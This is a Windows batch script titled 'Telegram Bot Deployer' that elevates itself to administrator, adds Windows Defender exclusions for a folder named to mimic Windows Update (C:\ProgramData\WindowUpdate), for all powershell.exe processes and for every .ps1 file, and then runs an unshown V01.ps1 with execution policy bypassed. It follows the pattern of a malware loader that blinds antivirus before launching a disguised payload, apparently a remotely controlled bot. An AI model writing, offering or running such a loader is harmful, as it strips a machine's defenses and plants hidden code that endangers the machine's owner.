@echo off
title Telegram Bot Deployer
color 0A

:: Check for Administrator privileges
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting Administrator privileges...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: Get current directory
set "SCRIPT_DIR=%~dp0"
set "DEPLOY_SCRIPT=%SCRIPT_DIR%V01.ps1"

echo ========================================
echo ========================================
echo.

:: ===== ADD WINDOWS DEFENDER EXCLUSIONS =====
echo [INFO] Adding Windows Defender exclusions...
echo.

:: Add exclusion for ProgramData\WindowUpdate folder
powershell -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData\WindowUpdate' -ErrorAction SilentlyContinue"

:: Also exclude the PowerShell process (optional but helps with performance)
powershell -Command "Add-MpPreference -ExclusionProcess 'powershell.exe' -ErrorAction SilentlyContinue"

:: Add exclusion for the script extension
powershell -Command "Add-MpPreference -ExclusionExtension '.ps1' -ErrorAction SilentlyContinue"

echo [INFO] Exclusions added successfully (if not already present).
echo.

:: Check if V01.ps1 exists in same directory
if not exist "%DEPLOY_SCRIPT%" (
    echo [ERROR] Could not find V01.ps1
    echo Please make sure V01.ps1 is in the same folder as this batch file.
    echo.
    pause
    exit /b 1
)

echo [INFO] Deploying bot to this machine...
echo.

:: Execute the PowerShell deployment script
powershell -NoProfile -ExecutionPolicy Bypass -File "%DEPLOY_SCRIPT%"

:: Check if deployment was successful
if %errorlevel% equ 0 (
    echo.
    echo ========================================
    echo    DEPLOYMENT SUCCESSFUL!
    echo ========================================
    echo.
    echo The bot has been deployed and started.
    echo.
) else (
    echo.
    echo ========================================
    echo    DEPLOYMENT FAILED!
    echo ========================================
    echo.
    echo Error code: %errorlevel%
    echo.
)

echo Press any key to exit...
pause >nul
exit /b 0